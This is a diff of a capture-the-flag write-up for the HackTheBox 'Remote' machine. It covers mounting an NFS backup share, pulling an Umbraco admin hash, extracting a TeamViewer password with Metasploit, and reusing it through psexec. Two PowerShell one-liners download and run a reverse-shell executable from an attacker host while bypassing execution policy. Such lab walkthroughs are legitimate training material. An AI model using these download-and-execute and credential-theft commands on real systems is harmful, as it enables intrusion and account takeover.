@@ -89,9 +89,10 @@ Nmap done: 1 IP address (1 host up) scanned in 84.11 seconds
       ` http://10.10.10.180/umbraco#/login/false?returnPath=%252Fumbraco`
    - Second important discovery:
       - I was able to mount a volume using the mountd service
+        
         `mount 10.10.10.180:/site_backups site_backups/`
       - It contained a directory called `App_data` with file `Umbraco.sdf`
-      - A quick google search revelead it's a database file
+      - A quick google search reveals it's a database file
       - Not sure how to open this file, I just drag and dropped it into my VSCode editor and instantly noticed a plain text string in load of garbage 
         
           `Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}`
@@ -119,22 +120,28 @@ Got the user flag `type c:\Users\Public\user.txt`
 * Now for finding privilege escalation to root, I spent too much time looking around the system and finding missing patches, etc but no luck. Hmm, the name of the machine is `remote` so there must be a remote access service that we can exploit. Did some service enumeration and found that TeamViewer is running. That's probably the way in.
 
 * In Metasploit, I noticed `windows/gather/credentials/teamviewer_passwords` module. So I spent the time to now get a proper shell into my msfconsole. I ended up using following commands in my existing reverse shell:
+
 ```
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.25:8000/rshell.exe');"
 
 powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.25:8000/rshell.exe',"$env:APPDATA\rshell.exe");Start-Process ("$env:APPDATA\rshell.exe")
 ```
+
 * Once I had the session in msfconsole, I run the `windows/gather/credentials/teamviewer_passwords` module and BAM!
+
   ```
   TeamViewer Client ID - 1769137322
   Unattended Password: !R3m0te!
   ```
+  
 * Now, I tried many ways to use these credentials to actually connect to the target machine using TeamViewer client but it did not work. I could not figure out what was going on. So I slept over it.
 * Next day, I was working and spent most of my day in Zoom meetings with my colleagues. At one point, there were disucssions about a phishing incident and re-using passwords. After tiring day of Zoomming, as I was recollecting my thoughts I realized the risks of **re-using passwords** and how it may be the trick in this HackTheBox challenge. 
 * It would be too easy I said to myself, but decided to give it a try anyway. Fired up msfconsole, 
+
 ```
 use windows/smb/psexec
 SMBUSer administrator
 SMBPass !R3m0te!
 ```
+
 and BAM! I could not believe it worked. And as easy as that, we get the root flag!
